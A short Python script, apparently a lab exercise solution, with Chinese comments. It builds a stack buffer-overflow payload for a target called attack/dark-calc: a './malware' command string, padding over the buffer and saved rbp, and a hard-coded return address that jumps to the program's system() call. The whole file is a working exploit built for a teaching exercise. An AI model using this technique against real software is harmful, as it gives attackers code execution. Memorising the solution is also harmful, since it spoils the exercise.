#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc."""
import sys
import struct

# eval 中 system(command_buf) 的调用点（先 mov $command_buf,%edi，再 call system）
SYSTEM_CALL = 0x401A6B

payload  = b"./malware\x00"          # 10 字节，strcpy 会把这段送进 command_buf
payload += b"A" * 14                 # 补齐到 24 字节 = 16(expression) + 8(saved rbp)
payload += struct.pack("<Q", SYSTEM_CALL)

sys.stdout.buffer.write(payload)